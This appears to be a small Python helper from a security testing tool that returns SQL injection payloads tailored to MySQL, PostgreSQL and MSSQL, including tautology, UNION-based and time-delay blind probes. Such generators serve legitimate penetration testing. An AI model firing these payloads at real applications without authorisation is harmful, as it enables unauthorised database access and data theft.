def generate_sqli(db):

    payloads = []

    if db == "mysql":
        payloads = [
            "' OR '1'='1' -- ",
            "' UNION SELECT null,null -- ",
            "' AND SLEEP(5) -- "
        ]

    elif db == "postgres":
        payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT null --",
            "'; SELECT pg_sleep(5)--"
        ]

    elif db == "mssql":
        payloads = [
            "' OR 1=1 --",
            "' UNION SELECT null--",
            "'; WAITFOR DELAY '0:0:5'--"
        ]

    else:
        payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT null --"
        ]


    return payloads
